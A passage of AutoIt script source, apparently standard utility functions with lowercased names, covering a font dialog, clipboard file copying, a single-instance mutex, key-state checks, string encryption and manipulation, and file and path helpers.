	DllStructSetData($tchoosefont, "hWndOwner", $hwndowner)
	DllStructSetData($tchoosefont, "LogFont", DllStructGetPtr($tlogfont))
	DllStructSetData($tchoosefont, "PointSize", $ipointsize)
	DllStructSetData($tchoosefont, "Flags", BitOR($cf_screenfonts, $cf_printerfonts, $cf_effects, $cf_inittologfontstruct, $cf_noscriptsel))
	DllStructSetData($tchoosefont, "rgbColors", $icolorref)
	DllStructSetData($tchoosefont, "FontType", 0)
	DllStructSetData($tlogfont, "Height", $lfheight)
	DllStructSetData($tlogfont, "Weight", $ifontweight)
	DllStructSetData($tlogfont, "Italic", $iitalic)
	DllStructSetData($tlogfont, "Underline", $iunderline)
	DllStructSetData($tlogfont, "Strikeout", $istrikethru)
	DllStructSetData($tlogfont, "FaceName", $sfontname)
	Local $aresult = DllCall("comdlg32.dll", "bool", "ChooseFontW", "struct*", $tchoosefont)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] = 0 Then Return SetError(-3, -3, -1)
	Local $fontname = DllStructGetData($tlogfont, "FaceName")
	If StringLen($fontname) = 0 AND StringLen($sfontname) > 0 Then $fontname = $sfontname
	If DllStructGetData($tlogfont, "Italic") Then $italic = 2
	If DllStructGetData($tlogfont, "Underline") Then $underline = 4
	If DllStructGetData($tlogfont, "Strikeout") Then $strikeout = 8
	Local $attributes = BitOR($italic, $underline, $strikeout)
	Local $size = DllStructGetData($tchoosefont, "PointSize") / 10
	Local $colorref = DllStructGetData($tchoosefont, "rgbColors")
	Local $weight = DllStructGetData($tlogfont, "Weight")
	Local $color_picked = Hex(String($colorref), 6)
	Return StringSplit($attributes & "," & $fontname & "," & $size & "," & $weight & "," & $colorref & "," & "0x" & $color_picked & "," & "0x" & StringMid($color_picked, 5, 2) & StringMid($color_picked, 3, 2) & StringMid($color_picked, 1, 2), ",")
EndFunc

Func _clipputfile($sfile, $sseparator = "|")
	Local Const $gmem_moveable = 2, $cf_hdrop = 15
	$sfile &= $sseparator & $sseparator
	Local $nglobmemsize = 2 * (StringLen($sfile) + 20)
	Local $aresult = DllCall("user32.dll", "bool", "OpenClipboard", "hwnd", 0)
	If @error OR $aresult[0] = 0 Then Return SetError(1, _winapi_getlasterror(), False)
	Local $ierror = 0, $ilasterror = 0
	$aresult = DllCall("user32.dll", "bool", "EmptyClipboard")
	If @error OR NOT $aresult[0] Then
		$ierror = 2
		$ilasterror = _winapi_getlasterror()
	Else
		$aresult = DllCall("kernel32.dll", "handle", "GlobalAlloc", "uint", $gmem_moveable, "ulong_ptr", $nglobmemsize)
		If @error OR NOT $aresult[0] Then
			$ierror = 3
			$ilasterror = _winapi_getlasterror()
		Else
			Local $hglobal = $aresult[0]
			$aresult = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hglobal)
			If @error OR NOT $aresult[0] Then
				$ierror = 4
				$ilasterror = _winapi_getlasterror()
			Else
				Local $hlock = $aresult[0]
				Local $dropfiles = DllStructCreate("dword pFiles;" & $tagpoint & ";bool fNC;bool fWide;wchar[" & StringLen($sfile) + 1 & "]", $hlock)
				If @error Then Return SetError(5, 6, False)
				Local $tempstruct = DllStructCreate("dword;long;long;bool;bool")
				DllStructSetData($dropfiles, "pFiles", DllStructGetSize($tempstruct))
				DllStructSetData($dropfiles, "X", 0)
				DllStructSetData($dropfiles, "Y", 0)
				DllStructSetData($dropfiles, "fNC", 0)
				DllStructSetData($dropfiles, "fWide", 1)
				DllStructSetData($dropfiles, 6, $sfile)
				For $i = 1 To StringLen($sfile)
					If DllStructGetData($dropfiles, 6, $i) = $sseparator Then DllStructSetData($dropfiles, 6, Chr(0), $i)
				Next
				$aresult = DllCall("user32.dll", "handle", "SetClipboardData", "uint", $cf_hdrop, "handle", $hglobal)
				If @error OR NOT $aresult[0] Then
					$ierror = 6
					$ilasterror = _winapi_getlasterror()
				EndIf
				$aresult = DllCall("kernel32.dll", "bool", "GlobalUnlock", "handle", $hglobal)
				If (@error OR NOT $aresult[0]) AND NOT $ierror AND _winapi_getlasterror() Then
					$ierror = 8
					$ilasterror = _winapi_getlasterror()
				EndIf
			EndIf
			$aresult = DllCall("kernel32.dll", "ptr", "GlobalFree", "handle", $hglobal)
			If (@error OR $aresult[0]) AND NOT $ierror Then
				$ierror = 9
				$ilasterror = _winapi_getlasterror()
			EndIf
		EndIf
	EndIf
	$aresult = DllCall("user32.dll", "bool", "CloseClipboard")
	If (@error OR NOT $aresult[0]) AND NOT $ierror Then Return SetError(7, _winapi_getlasterror(), False)
	If $ierror Then Return SetError($ierror, $ilasterror, False)
	Return True
EndFunc

Func _iif($ftest, $vtrueval, $vfalseval)
	If $ftest Then
		Return $vtrueval
	Else
		Return $vfalseval
	EndIf
EndFunc

Func _mousetrap($ileft = 0, $itop = 0, $iright = 0, $ibottom = 0)
	Local $aresult
	If @NumParams == 0 Then
		$aresult = DllCall("user32.dll", "bool", "ClipCursor", "ptr", 0)
		If @error OR NOT $aresult[0] Then Return SetError(1, _winapi_getlasterror(), False)
	Else
		If @NumParams == 2 Then
			$iright = $ileft + 1
			$ibottom = $itop + 1
		EndIf
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, "Left", $ileft)
		DllStructSetData($trect, "Top", $itop)
		DllStructSetData($trect, "Right", $iright)
		DllStructSetData($trect, "Bottom", $ibottom)
		$aresult = DllCall("user32.dll", "bool", "ClipCursor", "struct*", $trect)
		If @error OR NOT $aresult[0] Then Return SetError(2, _winapi_getlasterror(), False)
	EndIf
	Return True
EndFunc

Func _singleton($soccurencename, $iflag = 0)
	Local Const $error_already_exists = 183
	Local Const $security_descriptor_revision = 1
	Local $tsecurityattributes = 0
	If BitAND($iflag, 2) Then
		Local $tsecuritydescriptor = DllStructCreate("byte;byte;word;ptr[4]")
		Local $aret = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "struct*", $tsecuritydescriptor, "dword", $security_descriptor_revision)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then
			$aret = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "struct*", $tsecuritydescriptor, "bool", 1, "ptr", 0, "bool", 0)
			If @error Then Return SetError(@error, @extended, 0)
			If $aret[0] Then
				$tsecurityattributes = DllStructCreate($tagsecurity_attributes)
				DllStructSetData($tsecurityattributes, 1, DllStructGetSize($tsecurityattributes))
				DllStructSetData($tsecurityattributes, 2, DllStructGetPtr($tsecuritydescriptor))
				DllStructSetData($tsecurityattributes, 3, 0)
			EndIf
		EndIf
	EndIf
	Local $handle = DllCall("kernel32.dll", "handle", "CreateMutexW", "struct*", $tsecurityattributes, "bool", 1, "wstr", $soccurencename)
	If @error Then Return SetError(@error, @extended, 0)
	Local $lasterror = DllCall("kernel32.dll", "dword", "GetLastError")
	If @error Then Return SetError(@error, @extended, 0)
	If $lasterror[0] = $error_already_exists Then
		If BitAND($iflag, 1) Then
			Return SetError($lasterror[0], $lasterror[0], 0)
		Else
			Exit -1
		EndIf
	EndIf
	Return $handle[0]
EndFunc

Func _ispressed($shexkey, $vdll = "user32.dll")
	Local $a_r = DllCall($vdll, "short", "GetAsyncKeyState", "int", "0x" & $shexkey)
	If @error Then Return SetError(@error, @extended, False)
	Return BitAND($a_r[0], 32768) <> 0
EndFunc

Func _versioncompare($sversion1, $sversion2)
	If $sversion1 = $sversion2 Then Return 0
	Local $sep = "."
	If StringInStr($sversion1, $sep) = 0 Then $sep = ","
	Local $aversion1 = StringSplit($sversion1, $sep)
	Local $aversion2 = StringSplit($sversion2, $sep)
	If UBound($aversion1) <> UBound($aversion2) OR UBound($aversion1) = 0 Then
		SetExtended(1)
		If $sversion1 > $sversion2 Then
			Return 1
		ElseIf $sversion1 < $sversion2 Then
			Return -1
		EndIf
	Else
		For $i = 1 To UBound($aversion1) - 1
			If StringIsDigit($aversion1[$i]) AND StringIsDigit($aversion2[$i]) Then
				If Number($aversion1[$i]) > Number($aversion2[$i]) Then
					Return 1
				ElseIf Number($aversion1[$i]) < Number($aversion2[$i]) Then
					Return -1
				EndIf
			Else
				SetExtended(1)
				If $aversion1[$i] > $aversion2[$i] Then
					Return 1
				ElseIf $aversion1[$i] < $aversion2[$i] Then
					Return -1
				EndIf
			EndIf
		Next
	EndIf
	Return SetError(2, 0, 0)
EndFunc

Func __misc_getdc($hwnd)
	Local $aresult = DllCall("User32.dll", "handle", "GetDC", "hwnd", $hwnd)
	If @error OR NOT $aresult[0] Then Return SetError(1, _winapi_getlasterror(), 0)
	Return $aresult[0]
EndFunc

Func __misc_getdevicecaps($hdc, $iindex)
	Local $aresult = DllCall("GDI32.dll", "int", "GetDeviceCaps", "handle", $hdc, "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func __misc_releasedc($hwnd, $hdc)
	Local $aresult = DllCall("User32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0] <> 0
EndFunc

Func _hextostring($strhex)
	If StringLeft($strhex, 2) = "0x" Then Return BinaryToString($strhex)
	Return BinaryToString("0x" & $strhex)
EndFunc

Func _stringbetween($s_string, $s_start, $s_end, $v_case = -1)
	Local $s_case = ""
	If $v_case = Default OR $v_case = -1 Then $s_case = "(?i)"
	Local $s_pattern_escape = "(\.|\||\*|\?|\+|\(|\)|\{|\}|\[|\]|\^|\$|\\)"
	$s_start = StringRegExpReplace($s_start, $s_pattern_escape, "\\$1")
	$s_end = StringRegExpReplace($s_end, $s_pattern_escape, "\\$1")
	If $s_start = "" Then $s_start = "\A"
	If $s_end = "" Then $s_end = "\z"
	Local $a_ret = StringRegExp($s_string, "(?s)" & $s_case & $s_start & "(.*?)" & $s_end, 3)
	If @error Then Return SetError(1, 0, 0)
	Return $a_ret
EndFunc

Func _stringencrypt($i_encrypt, $s_encrypttext, $s_encryptpassword, $i_encryptlevel = 1)
	If $i_encrypt <> 0 AND $i_encrypt <> 1 Then
		SetError(1, 0, "")
	ElseIf $s_encrypttext = "" OR $s_encryptpassword = "" Then
		SetError(1, 0, "")
	Else
		If Number($i_encryptlevel) <= 0 OR Int($i_encryptlevel) <> $i_encryptlevel Then $i_encryptlevel = 1
		Local $v_encryptmodified
		Local $i_encryptcounth
		Local $i_encryptcountg
		Local $v_encryptswap
		Local $av_encryptbox[256][2]
		Local $i_encryptcounta
		Local $i_encryptcountb
		Local $i_encryptcountc
		Local $i_encryptcountd
		Local $i_encryptcounte
		Local $v_encryptcipher
		Local $v_encryptcipherby
		If $i_encrypt = 1 Then
			For $i_encryptcountf = 0 To $i_encryptlevel Step 1
				$i_encryptcountg = ""
				$i_encryptcounth = ""
				$v_encryptmodified = ""
				For $i_encryptcountg = 1 To StringLen($s_encrypttext)
					If $i_encryptcounth = StringLen($s_encryptpassword) Then
						$i_encryptcounth = 1
					Else
						$i_encryptcounth += 1
					EndIf
					$v_encryptmodified = $v_encryptmodified & Chr(BitXOR(Asc(StringMid($s_encrypttext, $i_encryptcountg, 1)), Asc(StringMid($s_encryptpassword, $i_encryptcounth, 1)), 255))
				Next
				$s_encrypttext = $v_encryptmodified
				$i_encryptcounta = ""
				$i_encryptcountb = 0
				$i_encryptcountc = ""
				$i_encryptcountd = ""
				$i_encryptcounte = ""
				$v_encryptcipherby = ""
				$v_encryptcipher = ""
				$v_encryptswap = ""
				$av_encryptbox = ""
				Local $av_encryptbox[256][2]
				For $i_encryptcounta = 0 To 255
					$av_encryptbox[$i_encryptcounta][1] = Asc(StringMid($s_encryptpassword, Mod($i_encryptcounta, StringLen($s_encryptpassword)) + 1, 1))
					$av_encryptbox[$i_encryptcounta][0] = $i_encryptcounta
				Next
				For $i_encryptcounta = 0 To 255
					$i_encryptcountb = Mod(($i_encryptcountb + $av_encryptbox[$i_encryptcounta][0] + $av_encryptbox[$i_encryptcounta][1]), 256)
					$v_encryptswap = $av_encryptbox[$i_encryptcounta][0]
					$av_encryptbox[$i_encryptcounta][0] = $av_encryptbox[$i_encryptcountb][0]
					$av_encryptbox[$i_encryptcountb][0] = $v_encryptswap
				Next
				For $i_encryptcounta = 1 To StringLen($s_encrypttext)
					$i_encryptcountc = Mod(($i_encryptcountc + 1), 256)
					$i_encryptcountd = Mod(($i_encryptcountd + $av_encryptbox[$i_encryptcountc][0]), 256)
					$i_encryptcounte = $av_encryptbox[Mod(($av_encryptbox[$i_encryptcountc][0] + $av_encryptbox[$i_encryptcountd][0]), 256)][0]
					$v_encryptcipherby = BitXOR(Asc(StringMid($s_encrypttext, $i_encryptcounta, 1)), $i_encryptcounte)
					$v_encryptcipher &= Hex($v_encryptcipherby, 2)
				Next
				$s_encrypttext = $v_encryptcipher
			Next
		Else
			For $i_encryptcountf = 0 To $i_encryptlevel Step 1
				$i_encryptcountb = 0
				$i_encryptcountc = ""
				$i_encryptcountd = ""
				$i_encryptcounte = ""
				$v_encryptcipherby = ""
				$v_encryptcipher = ""
				$v_encryptswap = ""
				$av_encryptbox = ""
				Local $av_encryptbox[256][2]
				For $i_encryptcounta = 0 To 255
					$av_encryptbox[$i_encryptcounta][1] = Asc(StringMid($s_encryptpassword, Mod($i_encryptcounta, StringLen($s_encryptpassword)) + 1, 1))
					$av_encryptbox[$i_encryptcounta][0] = $i_encryptcounta
				Next
				For $i_encryptcounta = 0 To 255
					$i_encryptcountb = Mod(($i_encryptcountb + $av_encryptbox[$i_encryptcounta][0] + $av_encryptbox[$i_encryptcounta][1]), 256)
					$v_encryptswap = $av_encryptbox[$i_encryptcounta][0]
					$av_encryptbox[$i_encryptcounta][0] = $av_encryptbox[$i_encryptcountb][0]
					$av_encryptbox[$i_encryptcountb][0] = $v_encryptswap
				Next
				For $i_encryptcounta = 1 To StringLen($s_encrypttext) Step 2
					$i_encryptcountc = Mod(($i_encryptcountc + 1), 256)
					$i_encryptcountd = Mod(($i_encryptcountd + $av_encryptbox[$i_encryptcountc][0]), 256)
					$i_encryptcounte = $av_encryptbox[Mod(($av_encryptbox[$i_encryptcountc][0] + $av_encryptbox[$i_encryptcountd][0]), 256)][0]
					$v_encryptcipherby = BitXOR(Dec(StringMid($s_encrypttext, $i_encryptcounta, 2)), $i_encryptcounte)
					$v_encryptcipher = $v_encryptcipher & Chr($v_encryptcipherby)
				Next
				$s_encrypttext = $v_encryptcipher
				$i_encryptcountg = ""
				$i_encryptcounth = ""
				$v_encryptmodified = ""
				For $i_encryptcountg = 1 To StringLen($s_encrypttext)
					If $i_encryptcounth = StringLen($s_encryptpassword) Then
						$i_encryptcounth = 1
					Else
						$i_encryptcounth += 1
					EndIf
					$v_encryptmodified &= Chr(BitXOR(Asc(StringMid($s_encrypttext, $i_encryptcountg, 1)), Asc(StringMid($s_encryptpassword, $i_encryptcounth, 1)), 255))
				Next
				$s_encrypttext = $v_encryptmodified
			Next
		EndIf
		Return $s_encrypttext
	EndIf
EndFunc

Func _stringexplode($sstring, $sdelimiter, $ilimit = 0)
	If $ilimit > 0 Then
		$sstring = StringReplace($sstring, $sdelimiter, Chr(0), $ilimit)
		$sdelimiter = Chr(0)
	ElseIf $ilimit < 0 Then
		Local $iindex = StringInStr($sstring, $sdelimiter, 0, $ilimit)
		If $iindex Then
			$sstring = StringLeft($sstring, $iindex - 1)
		EndIf
	EndIf
	Return StringSplit($sstring, $sdelimiter, 3)
EndFunc

Func _stringinsert($s_string, $s_insertstring, $i_position)
	Local $i_length, $s_start, $s_end
	If $s_string = "" OR (NOT IsString($s_string)) Then
		Return SetError(1, 0, $s_string)
	ElseIf $s_insertstring = "" OR (NOT IsString($s_string)) Then
		Return SetError(2, 0, $s_string)
	Else
		$i_length = StringLen($s_string)
		If (Abs($i_position) > $i_length) OR (NOT IsInt($i_position)) Then
			Return SetError(3, 0, $s_string)
		EndIf
	EndIf
	If $i_position = 0 Then
		Return $s_insertstring & $s_string
	ElseIf $i_position > 0 Then
		$s_start = StringLeft($s_string, $i_position)
		$s_end = StringRight($s_string, $i_length - $i_position)
		Return $s_start & $s_insertstring & $s_end
	ElseIf $i_position < 0 Then
		$s_start = StringLeft($s_string, Abs($i_length + $i_position))
		$s_end = StringRight($s_string, Abs($i_position))
		Return $s_start & $s_insertstring & $s_end
	EndIf
EndFunc

Func _stringproper($s_string)
	Local $ix = 0
	Local $capnext = 1
	Local $s_nstr = ""
	Local $s_curchar
	For $ix = 1 To StringLen($s_string)
		$s_curchar = StringMid($s_string, $ix, 1)
		Select 
			Case $capnext = 1
				If StringRegExp($s_curchar, "[a-zA-Zہ-ےڑœ‍ں]") Then
					$s_curchar = StringUpper($s_curchar)
					$capnext = 0
				EndIf
			Case NOT StringRegExp($s_curchar, "[a-zA-Zہ-ےڑœ‍ں]")
				$capnext = 1
			Case Else
				$s_curchar = StringLower($s_curchar)
		EndSelect
		$s_nstr &= $s_curchar
	Next
	Return $s_nstr
EndFunc

Func _stringrepeat($sstring, $irepeatcount)
	Local $sresult
	Select 
		Case NOT StringIsInt($irepeatcount)
			SetError(1)
			Return ""
		Case StringLen($sstring) < 1
			SetError(1)
			Return ""
		Case $irepeatcount <= 0
			SetError(1)
			Return ""
		Case Else
			For $icount = 1 To $irepeatcount
				$sresult &= $sstring
			Next
			Return $sresult
	EndSelect
EndFunc

Func _stringreverse($s_string)
	Local $i_len = StringLen($s_string)
	If $i_len < 1 Then Return SetError(1, 0, "")
	Local $t_chars = DllStructCreate("char[" & $i_len + 1 & "]")
	DllStructSetData($t_chars, 1, $s_string)
	Local $a_rev = DllCall("msvcrt.dll", "ptr:cdecl", "_strrev", "struct*", $t_chars)
	If @error OR $a_rev[0] = 0 Then Return SetError(2, 0, "")
	Return DllStructGetData($t_chars, 1)
EndFunc

Func _stringtohex($strchar)
	Return Hex(StringToBinary($strchar))
EndFunc

Global Const $fc_nooverwrite = 0
Global Const $fc_overwrite = 1
Global Const $ft_modified = 0
Global Const $ft_created = 1
Global Const $ft_accessed = 2
Global Const $fo_read = 0
Global Const $fo_append = 1
Global Const $fo_overwrite = 2
Global Const $fo_binary = 16
Global Const $fo_unicode = 32
Global Const $fo_utf16_le = 32
Global Const $fo_utf16_be = 64
Global Const $fo_utf8 = 128
Global Const $fo_utf8_nobom = 256
Global Const $eof = -1
Global Const $fd_filemustexist = 1
Global Const $fd_pathmustexist = 2
Global Const $fd_multiselect = 4
Global Const $fd_promptcreatenew = 8
Global Const $fd_promptoverwrite = 16
Global Const $create_new = 1
Global Const $create_always = 2
Global Const $open_existing = 3
Global Const $open_always = 4
Global Const $truncate_existing = 5
Global Const $invalid_set_file_pointer = -1
Global Const $file_begin = 0
Global Const $file_current = 1
Global Const $file_end = 2
Global Const $file_attribute_readonly = 1
Global Const $file_attribute_hidden = 2
Global Const $file_attribute_system = 4
Global Const $file_attribute_directory = 16
Global Const $file_attribute_archive = 32
Global Const $file_attribute_device = 64
Global Const $file_attribute_normal = 128
Global Const $file_attribute_temporary = 256
Global Const $file_attribute_sparse_file = 512
Global Const $file_attribute_reparse_point = 1024
Global Const $file_attribute_compressed = 2048
Global Const $file_attribute_offline = 4096
Global Const $file_attribute_not_content_indexed = 8192
Global Const $file_attribute_encrypted = 16384
Global Const $file_share_read = 1
Global Const $file_share_write = 2
Global Const $file_share_delete = 4
Global Const $generic_all = 268435456
Global Const $generic_execute = 536870912
Global Const $generic_write = 1073741824
Global Const $generic_read = -2147483648

Func _filecountlines($sfilepath)
	Local $hfile = FileOpen($sfilepath, $fo_read)
	If $hfile = -1 Then Return SetError(1, 0, 0)
	Local $sfilecontent = StringStripWS(FileRead($hfile), 2)
	FileClose($hfile)
	Local $atmp
	If StringInStr($sfilecontent, @LF) Then
		$atmp = StringSplit(StringStripCR($sfilecontent), @LF)
	ElseIf StringInStr($sfilecontent, @CR) Then
		$atmp = StringSplit($sfilecontent, @CR)
	Else
		If StringLen($sfilecontent) Then
			Return 1
		Else
			Return SetError(2, 0, 0)
		EndIf
	EndIf
	Return $atmp[0]
EndFunc

Func _filecreate($sfilepath)
	Local $hopenfile = FileOpen($sfilepath, $fo_overwrite)
	If $hopenfile = -1 Then Return SetError(1, 0, 0)
	Local $hwritefile = FileWrite($hopenfile, "")
	FileClose($hopenfile)
	If $hwritefile = -1 Then Return SetError(2, 0, 0)
	Return 1
EndFunc

Func _filelisttoarray($spath, $sfilter = "*", $iflag = 0)
	Local $hsearch, $sfile, $sfilelist, $sdelim = "|"
	$spath = StringRegExpReplace($spath, "[\\/]+\z", "") & "\"
	If NOT FileExists($spath) Then Return SetError(1, 1, "")
	If StringRegExp($sfilter, "[\\/:><\|]|(?s)\A\s*\z") Then Return SetError(2, 2, "")
	If NOT ($iflag = 0 OR $iflag = 1 OR $iflag = 2) Then Return SetError(3, 3, "")
	$hsearch = FileFindFirstFile($spath & $sfilter)
	If @error Then Return SetError(4, 4, "")
	While 1
		$sfile = FileFindNextFile($hsearch)
		If @error Then ExitLoop
		If ($iflag + @extended = 2) Then ContinueLoop
		$sfilelist &= $sdelim & $sfile
	WEnd
	FileClose($hsearch)
	If NOT $sfilelist Then Return SetError(4, 4, "")
	Return StringSplit(StringTrimLeft($sfilelist, 1), "|")
EndFunc

Func _fileprint($s_file, $i_show = @SW_HIDE)
	Local $a_ret = DllCall("shell32.dll", "int", "ShellExecuteW", "hwnd", 0, "wstr", "print", "wstr", $s_file, "wstr", "", "wstr", "", "int", $i_show)
	If @error Then Return SetError(@error, @extended, 0)
	If $a_ret[0] <= 32 Then Return SetError(10, $a_ret[0], 0)
	Return 1
EndFunc

Func _filereadtoarray($sfilepath, ByRef $aarray)
	Local $hfile = FileOpen($sfilepath, $fo_read)
	If $hfile = -1 Then Return SetError(1, 0, 0)
	Local $afile = FileRead($hfile, FileGetSize($sfilepath))
	If StringRight($afile, 1) = @LF Then $afile = StringTrimRight($afile, 1)
	If StringRight($afile, 1) = @CR Then $afile = StringTrimRight($afile, 1)
	FileClose($hfile)
	If StringInStr($afile, @LF) Then
		$aarray = StringSplit(StringStripCR($afile), @LF)
	ElseIf StringInStr($afile, @CR) Then
		$aarray = StringSplit($afile, @CR)
	Else
		If StringLen($afile) Then
			Dim $aarray[2] = [1, $afile]
		Else
			Return SetError(2, 0, 0)
		EndIf
	EndIf
	Return 1
EndFunc

Func _filewritefromarray($file, $a_array, $i_base = 0, $i_ubound = 0, $s_delim = "|")
	If NOT IsArray($a_array) Then Return SetError(2, 0, 0)
	Local $idims = UBound($a_array, 0)
	If $idims > 2 Then Return SetError(4, 0, 0)
	Local $last = UBound($a_array) - 1
	If $i_ubound < 1 OR $i_ubound > $last Then $i_ubound = $last
	If $i_base < 0 OR $i_base > $last Then $i_base = 0
	Local $hfile
	If IsString($file) Then
		$hfile = FileOpen($file, $fo_overwrite)
	Else
		$hfile = $file
	EndIf
	If $hfile = -1 Then Return SetError(1, 0, 0)
	Local $errorsav = 0
	Switch $idims
		Case 1
			For $x = $i_base To $i_ubound
				If FileWrite($hfile, $a_array[$x] & @CRLF) = 0 Then
					$errorsav = 3
					ExitLoop
				EndIf
			Next
		Case 2
			Local $s_temp
			For $x = $i_base To $i_ubound
				$s_temp = $a_array[$x][0]
				For $y = 1 To $idims
					$s_temp &= $s_delim & $a_array[$x][$y]
				Next
				If FileWrite($hfile, $s_temp & @CRLF) = 0 Then
					$errorsav = 3
					ExitLoop
				EndIf
			Next
	EndSwitch
	If IsString($file) Then FileClose($hfile)
	If $errorsav Then Return SetError($errorsav, 0, 0)
	Return 1
EndFunc

Func _filewritelog($slogpath, $slogmsg, $iflag = -1)
	Local $hopenfile = $slogpath, $iopenmode = $fo_append
	Local $sdatenow = @YEAR & "-" & @MON & "-" & @MDAY
	Local $stimenow = @HOUR & ":" & @MIN & ":" & @SEC
	Local $smsg = $sdatenow & " " & $stimenow & " : " & $slogmsg
	If $iflag <> -1 Then
		$smsg &= @CRLF & FileRead($slogpath)
		$iopenmode = $fo_overwrite
	EndIf
	If IsString($slogpath) Then
		$hopenfile = FileOpen($slogpath, $iopenmode)
		If $hopenfile = -1 Then
			Return SetError(1, 0, 0)
		EndIf
	EndIf
	Local $ireturn = FileWriteLine($hopenfile, $smsg)
	If IsString($slogpath) Then
		$ireturn = FileClose($hopenfile)
	EndIf
	If $ireturn <= 0 Then
		Return SetError(2, $ireturn, 0)
	EndIf
	Return $ireturn
EndFunc

Func _filewritetoline($sfile, $iline, $stext, $foverwrite = 0)
	If $iline <= 0 Then Return SetError(4, 0, 0)
	If NOT IsString($stext) Then
		$stext = String($stext)
		If $stext = "" Then Return SetError(6, 0, 0)
	EndIf
	If $foverwrite <> 0 AND $foverwrite <> 1 Then Return SetError(5, 0, 0)
	If NOT FileExists($sfile) Then Return SetError(2, 0, 0)
	Local $sread_file = FileRead($sfile)
	Local $asplit_file = StringSplit(StringStripCR($sread_file), @LF)
	If UBound($asplit_file) < $iline Then Return SetError(1, 0, 0)
	Local $iencoding = FileGetEncoding($sfile)
	Local $hfile = FileOpen($sfile, $iencoding + $fo_overwrite)
	If $hfile = -1 Then Return SetError(3, 0, 0)
	$sread_file = ""
	For $i = 1 To $asplit_file[0]
		If $i = $iline Then
			If $foverwrite = 1 Then
				If $stext <> "" Then $sread_file &= $stext & @CRLF
			Else
				$sread_file &= $stext & @CRLF & $asplit_file[$i] & @CRLF
			EndIf
		ElseIf $i < $asplit_file[0] Then
			$sread_file &= $asplit_file[$i] & @CRLF
		ElseIf $i = $asplit_file[0] Then
			$sread_file &= $asplit_file[$i]
		EndIf
	Next
	FileWrite($hfile, $sread_file)
	FileClose($hfile)
	Return 1
EndFunc

Func _pathfull($srelativepath, $sbasepath = @WorkingDir)
	If NOT $srelativepath OR $srelativepath = "." Then Return $sbasepath
	Local $sfullpath = StringReplace($srelativepath, "/", "\")
	Local Const $sfullpathconst = $sfullpath
	Local $spath
	Local $brootonly = StringLeft($sfullpath, 1) = "\" AND StringMid($sfullpath, 2, 1) <> "\"
	For $i = 1 To 2
		$spath = StringLeft($sfullpath, 2)
		If $spath = "\\" Then
			$sfullpath = StringTrimLeft($sfullpath, 2)
			Local $nserverlen = StringInStr($sfullpath, "\") - 1
			$spath = "\\" & StringLeft($sfullpath, $nserverlen)
			$sfullpath = StringTrimLeft($sfullpath, $nserverlen)
			ExitLoop
		ElseIf StringRight($spath, 1) = ":" Then
			$sfullpath = StringTrimLeft($sfullpath, 2)
			ExitLoop
		Else
			$sfullpath = $sbasepath & "\" & $sfullpath
		EndIf
	Next
	If $i = 3 Then Return ""
	If StringLeft($sfullpath, 1) <> "\" Then
		If StringLeft($sfullpathconst, 2) = StringLeft($sbasepath, 2) Then
			$sfullpath = $sbasepath & "\" & $sfullpath
		Else
			$sfullpath = "\" & $sfullpath
		EndIf
	EndIf
	Local $atemp = StringSplit($sfullpath, "\")
	Local $apathparts[$atemp[0]], $j = 0
	For $i = 2 To $atemp[0]
		If $atemp[$i] = ".." Then
			If $j Then $j -= 1
		ElseIf NOT ($atemp[$i] = "" AND $i <> $atemp[0]) AND $atemp[$i] <> "." Then
			$apathparts[$j] = $atemp[$i]
			$j += 1
		EndIf
	Next
	$sfullpath = $spath
	If NOT $brootonly Then
		For $i = 0 To $j - 1
			$sfullpath &= "\" & $apathparts[$i]
		Next
	Else
		$sfullpath &= $sfullpathconst
		If StringInStr($sfullpath, "..") Then $sfullpath = _pathfull($sfullpath)
	EndIf
	While StringInStr($sfullpath, ".\")
		$sfullpath = StringReplace($sfullpath, ".\", "\")
	WEnd
	Return $sfullpath
EndFunc

Func _pathgetrelative($sfrom, $sto)
	If StringRight($sfrom, 1) <> "\" Then $sfrom &= "\"
	If StringRight($sto, 1) <> "\" Then $sto &= "\"
	If $sfrom = $sto Then Return SetError(1, 0, StringTrimRight($sto, 1))
	Local $asfrom = StringSplit($sfrom, "\")
	Local $asto = StringSplit($sto, "\")
	If $asfrom[1] <> $asto[1] Then Return SetError(2, 0, StringTrimRight($sto, 1))
	Local $i = 2
	Local $idiff = 1
	While 1
		If $asfrom[$i] <> $asto[$i] Then
			$idiff = $i
			ExitLoop
		EndIf
		$i += 1
	WEnd
	$i = 1
	Local $srelpath = ""
	For $j = 1 To $asto[0]
		If $i >= $idiff Then
			$srelpath &= "\" & $asto[$i]
		EndIf
		$i += 1
	Next
	$srelpath = StringTrimLeft($srelpath, 1)
	$i = 1
	For $j = 1 To $asfrom[0]
		If $i > $idiff Then
			$srelpath = "..\" & $srelpath
		EndIf
		$i += 1
	Next
	If StringRight($srelpath, 1) == "\" Then $srelpath = StringTrimRight($srelpath, 1)
	Return $srelpath
EndFunc

Func _pathmake($szdrive, $szdir, $szfname, $szext)
	If StringLen($szdrive) Then
		If NOT (StringLeft($szdrive, 2) = "\\") Then $szdrive = StringLeft($szdrive, 1) & ":"
	EndIf
	If StringLen($szdir) Then
		If NOT (StringRight($szdir, 1) = "\") AND NOT (StringRight($szdir, 1) = "/") Then $szdir = $szdir & "\"
	EndIf
	If StringLen($szext) Then
		If NOT (StringLeft($szext, 1) = ".") Then $szext = "." & $szext
	EndIf
	Return $szdrive & $szdir & $szfname & $szext
EndFunc

Func _pathsplit($szpath, ByRef $szdrive, ByRef $szdir, ByRef $szfname, ByRef $szext)
	Local $drive = ""
	Local $dir = ""
	Local $fname = ""
	Local $ext = ""
	Local $pos
	Local $array[5]
	$array[0] = $szpath
	If StringMid($szpath, 2, 1) = ":" Then
		$drive = StringLeft($szpath, 2)
		$szpath = StringTrimLeft($szpath, 2)
	ElseIf StringLeft($szpath, 2) = "\\" Then
		$szpath = StringTrimLeft($szpath, 2)
		$pos = StringInStr($szpath, "\")
		If $pos = 0 Then $pos = StringInStr($szpath, "/")
		If $pos = 0 Then
			$drive = "\\" & $szpath
			$szpath = ""
		Else
			$drive = "\\" & StringLeft($szpath, $pos - 1)
